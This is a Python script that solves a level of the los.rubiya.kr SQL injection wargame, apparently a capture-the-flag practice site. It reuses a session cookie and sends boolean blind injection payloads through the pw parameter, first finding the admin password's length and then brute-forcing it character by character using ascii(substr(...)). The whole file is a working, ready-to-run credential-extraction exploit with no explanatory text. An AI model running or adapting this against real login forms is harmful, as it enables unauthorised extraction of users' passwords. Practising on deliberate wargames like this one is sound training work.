import requests, sys
from login import login



auth = login.get_cookie()
cookie = {'PHPSESSID': auth} # Your cookie of los.rubiya.kr

def check_length_passwd():
    i = 0

    while True:
        i += 1
        payload = f"1' or id='admin' and length(pw)={i}%23"
        url = f"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw={payload}"
        
        resp = requests.get(url, cookies=cookie)


        print(f"Trying password length: {i}")
    #    debug
    #    print (resp.text)
        
        if '<h2>Hello admin</h2>' in resp.text:
            print(f"Length of admin's password is: {i}")
            return i

#check_length_passwd()

def get_pw():
    length = check_length_passwd()
    pos = 1
    print ("Password found: ")
    while (pos <= length):
        for c in range (48,122):
            payload = f"1' or id='admin' and ascii(substr(pw,{pos},1))={c}%23"

            url = f"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw={payload}"
            
#            print (f"brute forcing at {pos} position")
            resp = requests.get(url, cookies=cookie)
#                print (resp.text)

            if '<h2>Hello admin</h2>' in resp.text:
#                print(f"Found password is: {c}")
                extr_char = chr(c)
                sys.stdout.write(extr_char)
                sys.stdout.flush()
                pos +=1

   
get_pw()



